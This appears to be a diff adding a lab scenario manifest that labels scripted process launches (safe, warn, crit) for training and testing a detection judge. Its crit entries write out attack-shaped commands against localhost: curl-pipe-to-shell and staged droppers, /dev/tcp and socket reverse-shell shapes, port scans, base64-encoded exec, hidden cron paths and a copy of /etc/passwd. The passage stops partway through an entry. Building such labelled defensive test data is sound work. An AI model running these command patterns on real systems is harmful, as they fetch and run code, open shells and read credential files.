@@ -1,0 +1,5201 @@
+# Lab scenario manifest: scripted process-launch sequences inside the lab containers, labelled by
+# construction for the judge (see [judge.categories] in src/jevmon/default.toml).
+#
+# Each [[scenarios]] entry starts `at` seconds into the run, lasts `duration` seconds and drives
+# its shell `steps` in `container`. Ground truth is `label`, one of the judge's three classes
+# `safe`, `warn`, `crit` (see [judge.categories] in src/jevmon/default.toml). A scenario with no
+# `label` carries an `excluded` reason instead: the judge sees one launch only, so rate and
+# resource scenarios (fork storms, retry and spin loops, memory growth) have no single-launch
+# label; they stay in the manifest and in the capture but are left out of the labelled export and
+# of every score. `family` groups parameterised variants - a whole family goes to one side of the
+# train/held-out split (manifest.split_of), so held-out families are unseen. `expected` is the
+# number of payload launches the command spawns by construction (driver shell included, counted
+# by hand); the report compares it against what the tier-0 poller actually observed.
+#
+# Commands are deliberately harmless (echo/sleep/true, cp of system binaries to new names, short
+# shell loops, python -c print/alloc loops, curl against the lab's own nginx). What differs is the
+# launch PATTERN: safe build/package/shell/timer/session/swarm shapes, one-off warn runs, crit
+# shapes (copied binary in a world-writable dir, inline encoded command, unexpected parent,
+# hidden scheduled task, download-and-run) and bounded rate/resource runs (excluded) confined by
+# the container cgroup limits (pids, memory, cpus). Scenarios whose payloads live well under the
+# poll interval are the deliberately short-lived variants: their miss rate is measured, not
+# hidden.
+#
+# The `background.idle` scenario runs in the actor container for the whole run (safe traffic);
+# everything else runs in the target. Tag windows must not overlap per container (validated).
+
+run_seconds = 7140
+grace_seconds = 3.0
+
+[limits]
+memory = "512m"      # container memory == swap limit (no swap); mem_grower stays under it
+cpus = "1.0"         # one core: cpu_spin is throttled here, never on the host
+pids = 256           # fork storms are bounded by this
+scratch = "64m"      # size-limited tmpfs at /scratch
+
+# ---------------------------------------------------------------------------------------------
+# Background: a benign periodic worker in the actor container for the whole run, so safe
+# contexts exist outside the scenario windows too (they carry no ground-truth label).
+# ---------------------------------------------------------------------------------------------
+[[scenarios]]
+id = "background.idle"
+family = "idle_daemon"
+label = "safe"
+container = "actor"
+expected = 0
+at = 0
+duration = 1318
+# Slower cadence than the original 3 s loop: the run grew and one held-out family must not
+# drown the class mix (docs/finetune.md, stage 3).
+steps = [
+  { cmd = "nohup sh -c 'i=0; while [ $i -lt 80 ]; do sleep 6 & i=$((i+1)); sleep 6; wait; done' >/dev/null 2>&1 & sleep 1; true", timeout = 15 },
+]
+
+# =============================================================================================
+# ROUTINE: launch patterns a workstation shows every day.
+# =============================================================================================
+
+[[scenarios]]
+id = "build_fanout.a"
+family = "build_fanout"
+label = "safe"
+expected = 9            # driver shell + 8 parallel sleeps
+at = 5
+duration = 10
+params = { n = 8, secs = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {secs} & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "build_fanout.b"
+family = "build_fanout"
+label = "safe"
+expected = 13           # driver + 4x (cp, compiled 'true', sleep 1)
+at = 263
+duration = 8
+params = { n = 4, secs = 1 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/cc.$i && /tmp/cc.$i; sleep {secs}; i=$((i+1)); done", timeout = 20 },
+]
+
+[[scenarios]]
+id = "pkg_install.a"
+family = "pkg_install"
+label = "safe"
+expected = 6            # driver + unpack sleep + 3x cp + configure sleep
+at = 19
+duration = 10
+params = { n = 3, unpack = 2, configure = 3 }
+steps = [
+  { cmd = "sleep {unpack}; i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/pkg.$i; i=$((i+1)); done; sleep {configure}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "pkg_install.b"
+family = "pkg_install"
+label = "safe"
+expected = 21           # driver + 10x (cp, unpacked binary): short-lived by construction
+at = 276
+duration = 6
+params = { n = 10 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/unp.$i && /tmp/unp.$i; i=$((i+1)); done", timeout = 20 },
+]
+
+[[scenarios]]
+id = "interactive_shell.a"
+family = "interactive_shell"
+label = "safe"
+expected = 5            # driver + nested sh + sleep, two levels
+at = 34
+duration = 10
+steps = [{ cmd = "sh -c 'sleep 3; sh -c \"sleep 3\"'", timeout = 30 }]
+
+[[scenarios]]
+id = "interactive_shell.b"
+family = "interactive_shell"
+label = "safe"
+expected = 5            # driver + two nested shells + two sleeps
+at = 287
+duration = 12
+steps = [{ cmd = "sh -c 'sh -c \"sleep 3; sh -c \\\"sleep 3\\\"\"'", timeout = 30 }]
+
+[[scenarios]]
+id = "cron_timer.a"
+family = "cron_timer"
+label = "safe"
+expected = 9            # driver + 4 jobs + 4 cadence sleeps (job every 3s)
+at = 49
+duration = 16
+params = { n = 4, job = 3, cadence = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do sleep {job} & i=$((i+1)); sleep {cadence}; done; wait", timeout = 30 },
+]
+
+[[scenarios]]
+id = "cron_timer.b"
+family = "cron_timer"
+label = "safe"
+expected = 13           # driver + 6 jobs + 6 cadence sleeps (job every 2s)
+at = 304
+duration = 16
+params = { n = 6, job = 1, cadence = 2 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do sleep {job} & i=$((i+1)); sleep {cadence}; done; wait", timeout = 30 },
+]
+
+[[scenarios]]
+id = "ssh_session.a"
+family = "ssh_session"
+label = "safe"
+expected = 5            # driver + 2x (setsid session shell + its sleep)
+at = 70
+duration = 10
+params = { n = 2, secs = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do setsid sh -c \"sleep {secs}\" & i=$((i+1)); done; wait", timeout = 30 },
+]
+
+[[scenarios]]
+id = "ssh_session.b"
+family = "ssh_session"
+label = "safe"
+expected = 9            # driver + 4x (setsid session shell + its sleep)
+at = 325
+duration = 12
+params = { n = 4, secs = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do setsid sh -c \"sleep {secs}\" & i=$((i+1)); done; wait", timeout = 30 },
+]
+
+[[scenarios]]
+id = "agent_swarm.a"
+family = "agent_swarm"
+label = "safe"
+expected = 21           # driver + 20 workers of 50 ms: the deliberately short-lived variant
+at = 85
+duration = 6
+params = { n = 20, work = 0.05, tail = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do sleep {work} & i=$((i+1)); done; sleep {tail}; wait", timeout = 20 },
+]
+
+[[scenarios]]
+id = "agent_swarm.b"
+family = "agent_swarm"
+label = "safe"
+expected = 11           # driver + 10 workers of 400 ms
+at = 342
+duration = 8
+params = { n = 10, work = 0.4, tail = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do sleep {work} & i=$((i+1)); done; sleep {tail}; wait", timeout = 20 },
+]
+
+# =============================================================================================
+# UNUSUAL-BUT-BENIGN: expected on a developer box, but a one-off, not a repeating pattern.
+# =============================================================================================
+
+[[scenarios]]
+id = "home_script.a"
+family = "home_script"
+label = "warn"
+expected = 4            # driver + mkdir + script shell + its sleep
+at = 96
+duration = 10
+params = { path = "/root/bin", script = "deploy.sh", secs = 3 }
+steps = [
+  { cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh bin/{script}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "home_script.b"
+family = "home_script"
+label = "warn"
+expected = 4            # driver + mkdir + script shell + its sleep
+at = 355
+duration = 12
+params = { path = "/root/.local/bin", script = "once.sh", secs = 5 }
+steps = [
+  { cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh .local/bin/{script}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "new_tool.a"
+family = "new_tool"
+label = "warn"
+expected = 3            # driver + cp + the freshly installed binary
+at = 111
+duration = 10
+params = { dir = "/opt", name = "lumen", secs = 3 }
+steps = [
+  { cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "new_tool.b"
+family = "new_tool"
+label = "warn"
+expected = 3            # driver + cp + the freshly installed binary
+at = 372
+duration = 12
+params = { dir = "/usr/local/bin", name = "forge", secs = 4 }
+steps = [
+  { cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "debugger_launch.a"
+family = "debugger_launch"
+label = "warn"
+expected = 3            # driver + python debugger stand-in + debuggee
+at = 126
+duration = 10
+steps = [
+  { cmd = "python3 -c \"import subprocess; p = subprocess.Popen(['sleep', '3']); p.wait()\"", timeout = 30 },
+]
+
+[[scenarios]]
+id = "debugger_launch.b"
+family = "debugger_launch"
+label = "warn"
+expected = 4            # driver + python stand-in + shell + debuggee
+at = 389
+duration = 10
+steps = [
+  { cmd = "python3 -c \"import subprocess; p = subprocess.Popen(['sh', '-c', 'sleep 3']); p.wait()\"", timeout = 30 },
+]
+
+# =============================================================================================
+# SUSPICIOUS: shapes an attack would use; every command itself is harmless.
+# =============================================================================================
+
+[[scenarios]]
+id = "tmpfs_copy.a"
+family = "tmpfs_copy"
+label = "crit"
+expected = 4            # driver + cp + chmod + executed copy in a world-writable dir
+at = 141
+duration = 10
+params = { path = "/tmp/.cache-services", secs = 3 }
+steps = [
+  { cmd = "cp /usr/bin/sleep {path} && chmod +x {path} && {path} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "tmpfs_copy.b"
+family = "tmpfs_copy"
+label = "crit"
+expected = 5            # driver + mkdir + cp + chmod + executed copy
+at = 404
+duration = 12
+params = { path = "/var/tmp/.font-unix/xrdp", secs = 4 }
+steps = [
+  { cmd = "mkdir -p $(dirname {path}) && cp /usr/bin/sleep {path} && chmod 755 {path} && {path} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "inline_encoded.a"
+family = "inline_encoded"
+label = "crit"
+expected = 2            # driver + interpreter running the inline base64 payload (sleeps 3)
+at = 156
+duration = 8
+params = { payload = "aW1wb3J0IHRpbWU7dGltZS5zbGVlcCgzKQ==" }
+steps = [
+  { cmd = "python3 -c \"import base64; exec(base64.b64decode('{payload}'))\"", timeout = 20 },
+]
+
+[[scenarios]]
+id = "inline_encoded.b"
+family = "inline_encoded"
+label = "crit"
+expected = 2            # driver + interpreter running the zlib+base64 payload (sleeps 2)
+at = 421
+duration = 8
+params = { payload = "eNrLzC3ILypRKMnMTbUGEXrFOampBRpGmgB+wwkf" }
+steps = [
+  { cmd = "python3 -c \"import zlib, base64; exec(zlib.decompress(base64.b64decode('{payload}')))\"", timeout = 20 },
+]
+
+[[scenarios]]
+id = "unexpected_parent.a"
+family = "unexpected_parent"
+label = "crit"
+expected = 5            # driver + cp + 'document viewer' stand-in + shell + payload
+at = 169
+duration = 10
+params = { path = "/usr/local/bin/atril-1.26" }
+steps = [
+  { cmd = "cp /usr/bin/python3 {path} && {path} -c \"import subprocess; subprocess.run(['sh', '-c', 'sleep 3'])\"", timeout = 30 },
+]
+
+[[scenarios]]
+id = "unexpected_parent.b"
+family = "unexpected_parent"
+label = "crit"
+expected = 4            # driver + cp + stand-in + payload
+at = 434
+duration = 10
+params = { path = "/opt/okular-bin" }
+steps = [
+  { cmd = "cp /usr/bin/python3 {path} && {path} -c \"import subprocess; subprocess.run(['sleep', '3'])\"", timeout = 30 },
+]
+
+[[scenarios]]
+id = "hidden_cron.a"
+family = "hidden_cron"
+label = "crit"
+expected = 4            # driver + mkdir + cp + executed binary from a hidden path
+at = 184
+duration = 10
+params = { path = "/root/.cache/.fontd", secs = 3 }
+steps = [
+  { cmd = "mkdir -p {path} && printf '* * * * * {path}/.sysd\\n' > {path}/entry && cp /usr/bin/sleep {path}/.sysd && cd {path} && ./.sysd {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "hidden_cron.b"
+family = "hidden_cron"
+label = "crit"
+expected = 5            # driver + mkdir + cp + shell + payload from a hidden path
+at = 449
+duration = 12
+params = { path = "/var/spool/.backup", secs = 3 }
+steps = [
+  { cmd = "mkdir -p {path} && printf '* * * * * {path}/.task.bin\\n' > {path}/.task && cp /usr/bin/sleep {path}/.task.bin && cd {path} && sh -c './.task.bin {secs}'", timeout = 30 },
+]
+
+[[scenarios]]
+id = "curl_pipe.a"
+family = "curl_pipe"
+label = "crit"
+expected = 4            # driver + curl + shell + the fetched script's sleep
+at = 199
+duration = 10
+steps = [{ cmd = "curl -sf http://127.0.0.1/payload.sh | sh", timeout = 20 }]
+
+[[scenarios]]
+id = "curl_pipe.b"
+family = "curl_pipe"
+label = "crit"
+expected = 4            # driver + curl + shell + the fetched script's sleep
+at = 466
+duration = 10
+steps = [
+  { cmd = "curl -sf -o /tmp/u.sh http://127.0.0.1/payload.sh && sh /tmp/u.sh", timeout = 20 },
+]
+
+# =============================================================================================
+# RUNAWAY: bounded by the container cgroup limits (pids / cpus / memory), never the host's.
+# =============================================================================================
+
+[[scenarios]]
+id = "fork_storm.a"
+family = "fork_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 61           # driver + 60 short-lived children (pids limit 256)
+at = 214
+duration = 8
+params = { n = 60, spin = 0.05, tail = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do sleep {spin} & i=$((i+1)); done; sleep {tail}; wait", timeout = 30 },
+]
+
+[[scenarios]]
+id = "fork_storm.b"
+family = "fork_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 151          # driver + 150 near-instant children, still under the pids limit
+at = 481
+duration = 8
+params = { n = 150, spin = 0.02, tail = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do sleep {spin} & i=$((i+1)); done; sleep {tail}; wait", timeout = 30 },
+]
+
+[[scenarios]]
+id = "cpu_spin.a"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + spinner pinned to the container's single CPU
+at = 227
+duration = 12
+params = { secs = 8 }
+steps = [
+  { cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 20 },
+]
+
+[[scenarios]]
+id = "cpu_spin.b"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + longer spinner
+at = 494
+duration = 16
+params = { secs = 14 }
+steps = [
+  { cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 30 },
+]
+
+[[scenarios]]
+id = "mem_grower.a"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + grower reaching ~160 MB under the 512m limit
+at = 244
+duration = 14
+params = { n = 20, gap = 0.5 }
+steps = [
+  { cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 30 },
+]
+
+[[scenarios]]
+id = "mem_grower.b"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + grower reaching ~304 MB under the 512m limit
+at = 515
+duration = 15
+params = { n = 38, gap = 0.3 }
+steps = [
+  { cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 35 },
+]
+
+# ---------------------------------------------------------------------------------------------
+# Stage-3 rebalance (docs/finetune.md): more contexts where the split was starved - routine
+# training families (build_fanout, pkg_install, interactive_shell) and the held-out non-routine
+# families (tmpfs_copy, home_script, new_tool, cpu_spin). Same shapes as the a/b variants with
+# different counts, durations and paths; every payload lives at least 3 s so tier 0 sees it.
+# ---------------------------------------------------------------------------------------------
+
+[[scenarios]]
+id = "build_fanout.c"
+family = "build_fanout"
+label = "safe"
+expected = 17           # driver + 16 parallel sleeps
+at = 535
+duration = 12
+params = { n = 16, secs = 4 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {secs} & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "build_fanout.d"
+family = "build_fanout"
+label = "safe"
+expected = 13           # driver + 6x (cp, the copied sleep binary for 3 s)
+at = 552
+duration = 10
+params = { n = 6, secs = 3 }
+steps = [
+  { cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/sleep /tmp/cc.$i && /tmp/cc.$i {secs}; i=$((i+1)); done", timeout = 30 },
+]
+
+[[scenarios]]
+id = "pkg_install.c"
+family = "pkg_install"
+label = "safe"
+expected = 15           # driver + unpack sleep + 4x (cp, unpacked binary, sleep) + configure sleep
+at = 567
+duration = 14
+params = { n = 4 }
+steps = [
+  { cmd = "sleep 2; i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/pkg.$i && /tmp/pkg.$i; sleep 2; i=$((i+1)); done; sleep 3", timeout = 40 },
+]
+
+[[scenarios]]
+id = "pkg_install.d"
+family = "pkg_install"
+label = "safe"
+expected = 6            # driver + unpack sleep + 3x cp + one installed binary run for 4 s
+at = 586
+duration = 12
+params = { n = 3, secs = 4 }
+steps = [
+  { cmd = "sleep 3; i=0; while [ $i -lt {n} ]; do cp /bin/sleep /tmp/pkgd.$i; i=$((i+1)); done; /tmp/pkgd.0 {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "interactive_shell.c"
+family = "interactive_shell"
+label = "safe"
+expected = 6            # driver + three nested shells + two sleeps
+at = 603
+duration = 12
+steps = [{ cmd = "sh -c 'sh -c \"sleep 4; sh -c \\\"sleep 4\\\"\"'", timeout = 30 }]
+
+[[scenarios]]
+id = "interactive_shell.d"
+family = "interactive_shell"
+label = "safe"
+expected = 5            # driver + two sleeps + nested shell + its sleep
+at = 620
+duration = 12
+steps = [{ cmd = "sh -c 'sleep 3; sleep 3; sh -c \"sleep 3\"'", timeout = 30 }]
+
+[[scenarios]]
+id = "tmpfs_copy.c"
+family = "tmpfs_copy"
+label = "crit"
+expected = 4            # driver + cp + chmod + executed copy in a world-writable dir
+at = 637
+duration = 12
+params = { path = "/tmp/.cache-xres", secs = 4 }
+steps = [
+  { cmd = "cp /usr/bin/sleep {path} && chmod +x {path} && {path} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "tmpfs_copy.d"
+family = "tmpfs_copy"
+label = "crit"
+expected = 5            # driver + mkdir + cp + chmod + executed copy
+at = 654
+duration = 12
+params = { path = "/var/tmp/.X11-unix/.x11sock", secs = 4 }
+steps = [
+  { cmd = "mkdir -p $(dirname {path}) && cp /usr/bin/sleep {path} && chmod 755 {path} && {path} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "home_script.c"
+family = "home_script"
+label = "warn"
+expected = 4            # driver + mkdir + script shell + its sleep
+at = 671
+duration = 12
+params = { path = "/root/bin", script = "sync.sh", secs = 4 }
+steps = [
+  { cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh bin/{script}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "home_script.d"
+family = "home_script"
+label = "warn"
+expected = 4            # driver + mkdir + script shell + its sleep
+at = 688
+duration = 10
+params = { path = "/root/.local/share/bin", script = "boot.sh", secs = 5 }
+steps = [
+  { cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh .local/share/bin/{script}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "new_tool.c"
+family = "new_tool"
+label = "warn"
+expected = 3            # driver + cp + the freshly installed binary
+at = 703
+duration = 10
+params = { dir = "/usr/local/sbin", name = "sentinel", secs = 4 }
+steps = [
+  { cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 },
+]
+
+[[scenarios]]
+id = "cpu_spin.c"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + spinner pinned to the container's single CPU
+at = 718
+duration = 14
+params = { secs = 6 }
+steps = [
+  { cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 20 },
+]
+
+[[scenarios]]
+id = "cpu_spin.d"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + longer spinner
+at = 737
+duration = 16
+params = { secs = 10 }
+steps = [
+  { cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 30 },
+]
+
+# Stage-3, pass 2: the first rebalance left train runaway and unusual starved (tier 0 catches
+# fork_storm children only by luck; short-lived is the exception). These are long-lived,
+# deterministically observed payloads in train families - same shapes, new counts and paths.
+
+[[scenarios]]
+id = "mem_grower.c"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + grower reaching ~192 MB under the 512m limit
+at = 758
+duration = 14
+params = { n = 24, gap = 0.4 }
+steps = [
+  { cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 35 },
+]
+
+[[scenarios]]
+id = "mem_grower.d"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2            # driver + grower reaching ~240 MB under the 512m limit
+at = 777
+duration = 15
+params = { n = 30, gap = 0.35 }
+steps = [
+  { cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 35 },
+]
+
+[[scenarios]]
+id = "debugger_launch.c"
+family = "debugger_launch"
+label = "warn"
+expected = 3            # driver + python stand-in + debuggee
+at = 797
+duration = 10
+steps = [
+  { cmd = "python3 -c \"import subprocess; p = subprocess.Popen(['sleep', '4']); p.wait()\"", timeout = 30 },
+]
+
+[[scenarios]]
+id = "debugger_launch.d"
+family = "debugger_launch"
+label = "warn"
+expected = 4            # driver + python stand-in + shell + debuggee
+at = 812
+duration = 10
+steps = [
+  { cmd = "python3 -c \"import subprocess; p = subprocess.Popen(['sh', '-c', 'sleep 4']); p.wait()\"", timeout = 30 },
+]
+
+# ---------------------------------------------------------------------------------------------
+# Stage-3, pass 3 (docs/finetune.md): NEW families so the held-out split has several non-routine
+# families per class, not one. Family names were picked so manifest.split_of puts the first
+# eight (reverse_shell, port_scan, backup_job, editor_plugin, miner_like, disk_filler, fd_leak
+# plus tmpfs_copy/home_script/new_tool/cpu_spin from before) in held-out and the rest in train;
+# nothing about a family is shared between splits. Every payload lives >= 3 s so tier 0 sees it.
+# ---------------------------------------------------------------------------------------------
+
+[[scenarios]]
+id = "reverse_shell.a"
+family = "reverse_shell"
+label = "crit"
+expected = 3           # driver + bash holding a socket to the lab nginx + its sleep
+at = 830
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; printf \"GET / HTTP/1.0\\r\\n\\r\\n\" >&3; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "reverse_shell.b"
+family = "reverse_shell"
+label = "crit"
+expected = 3           # driver + python with a socket on stdio + sleep
+at = 844
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "python3 -c \"import socket, subprocess, os; s = socket.create_connection(('127.0.0.1', 80)); subprocess.run(['sleep', '{secs}'], stdin=s.fileno(), stdout=s.fileno())\"", timeout = 30 }]
+
+[[scenarios]]
+id = "port_scan.a"
+family = "port_scan"
+label = "crit"
+expected = 2           # driver + bash probing ten ports
+at = 858
+duration = 10
+params = { secs = 3 }
+steps = [{ cmd = "bash -c 'for p in 21 22 23 25 80 110 443 3306 5432 8080; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null; done; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "port_scan.b"
+family = "port_scan"
+label = "crit"
+expected = 2           # driver + python sweeping 1200 ports
+at = 872
+duration = 12
+params = { secs = 4 }
+steps = [{ cmd = "python3 -c \"import socket, time; [socket.socket().connect_ex(('127.0.0.1', p)) for p in range(1, 1200)]; time.sleep({secs})\"", timeout = 30 }]
+
+[[scenarios]]
+id = "backup_job.a"
+family = "backup_job"
+label = "warn"
+expected = 3           # driver + mkdir + tar + shell + sleep
+at = 888
+duration = 10
+params = { dir = "/srv/backup", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && tar -cf {dir}/etc.tar /etc/hostname 2>/dev/null; sh -c 'sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "backup_job.b"
+family = "backup_job"
+label = "warn"
+expected = 3           # driver + mkdir + cp + shell + sleep
+at = 902
+duration = 12
+params = { dir = "/mnt/offsite", secs = 5 }
+steps = [{ cmd = "mkdir -p {dir} && cp -r /etc/hostname /etc/os-release {dir}/ && sh -c 'sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "editor_plugin.a"
+family = "editor_plugin"
+label = "warn"
+expected = 3           # driver + mkdir + cp + extension helper
+at = 918
+duration = 10
+params = { dir = "/root/.vscode/extensions/lint-1.2", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/helper && {dir}/helper {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "editor_plugin.b"
+family = "editor_plugin"
+label = "warn"
+expected = 3           # driver + mkdir + cp + language server stand-in
+at = 932
+duration = 10
+params = { dir = "/root/.config/Code/bin", secs = 5 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/lsp-server && {dir}/lsp-server {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "miner_like.a"
+family = "miner_like"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3           # two sustained spinners
+at = 946
+duration = 14
+params = { secs = 9 }
+steps = [{ cmd = "python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & wait", timeout = 30 }]
+
+[[scenarios]]
+id = "miner_like.b"
+family = "miner_like"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 4           # three sustained spinners
+at = 964
+duration = 14
+params = { secs = 7 }
+steps = [{ cmd = "python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & wait", timeout = 30 }]
+
+[[scenarios]]
+id = "disk_filler.a"
+family = "disk_filler"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + dd bursts into the scratch tmpfs (4 MB each)
+at = 982
+duration = 14
+params = { n = 12 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do dd if=/dev/zero of=/scratch/fill.$i bs=1M count=4 2>/dev/null; sleep 0.8; i=$((i+1)); done; rm -f /scratch/fill.*", timeout = 30 }]
+
+[[scenarios]]
+id = "disk_filler.b"
+family = "disk_filler"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + larger dd bursts
+at = 1000
+duration = 14
+params = { n = 8 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do dd if=/dev/zero of=/scratch/blob.$i bs=1M count=6 2>/dev/null; sleep 1.2; i=$((i+1)); done; rm -f /scratch/blob.*", timeout = 30 }]
+
+[[scenarios]]
+id = "fd_leak.a"
+family = "fd_leak"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + python holding 800 descriptors
+at = 1018
+duration = 10
+params = { n = 800 }
+steps = [{ cmd = "python3 -c \"import time; fs = [open('/dev/null') for _ in range({n})]; time.sleep(4)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "fd_leak.b"
+family = "fd_leak"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + python holding 800 pipe descriptors
+at = 1032
+duration = 10
+params = { n = 400 }
+steps = [{ cmd = "python3 -c \"import os, time; ps = [os.pipe() for _ in range({n})]; time.sleep(4)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "shadow_copy.a"
+family = "shadow_copy"
+label = "crit"
+expected = 4           # driver + 2x cp + payload from a system lib dir
+at = 1046
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "cp /etc/passwd /tmp/.p && cp /usr/bin/sleep /usr/local/lib/.s && /usr/local/lib/.s {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "shadow_copy.b"
+family = "shadow_copy"
+label = "crit"
+expected = 4           # driver + 2x cp + payload from a hidden /var/tmp file
+at = 1060
+duration = 10
+params = { secs = 5 }
+steps = [{ cmd = "cp /etc/hostname /var/tmp/.h && cp /usr/bin/sleep /var/tmp/.k && /var/tmp/.k {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "dropper_stage.a"
+family = "dropper_stage"
+label = "crit"
+expected = 4           # driver + curl + chmod + staged script
+at = 1074
+duration = 12
+params = { secs = 3 }
+steps = [{ cmd = "curl -sf -o /var/lib/.d http://127.0.0.1/payload.sh && chmod +x /var/lib/.d && /var/lib/.d", timeout = 30 }]
+
+[[scenarios]]
+id = "dropper_stage.b"
+family = "dropper_stage"
+label = "crit"
+expected = 4           # driver + curl + chmod + shell + script
+at = 1090
+duration = 12
+params = { secs = 3 }
+steps = [{ cmd = "curl -sf -o /var/tmp/.upd http://127.0.0.1/payload.sh && chmod 700 /var/tmp/.upd && sh /var/tmp/.upd", timeout = 30 }]
+
+[[scenarios]]
+id = "ld_preload_hijack.a"
+family = "ld_preload_hijack"
+label = "crit"
+expected = 2           # driver + sleep with a preload from /tmp
+at = 1106
+duration = 10
+params = { secs = 4 }
